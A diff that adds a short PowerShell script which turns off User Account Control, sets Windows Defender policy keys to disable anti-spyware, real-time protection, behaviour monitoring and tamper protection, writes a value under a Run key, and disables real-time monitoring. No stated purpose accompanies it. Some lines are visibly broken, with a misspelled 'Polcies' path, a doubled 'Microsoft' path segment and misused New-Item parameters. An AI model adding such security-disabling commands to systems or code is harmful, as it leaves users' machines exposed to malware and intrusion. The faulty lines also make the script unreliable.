@@ -1,0 +1,8 @@
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system" -Name EnableLUA -Value 0 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "Real-Time Protection" -Value 1 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Polcies\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Type DWord -Force
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Microsoft\Windows\CurrentVersion\run" -Name "TamperProtection" -Value 0 -Type DWord -Force
+Set-MpPreference -DisableRealtimeMonitoring $true
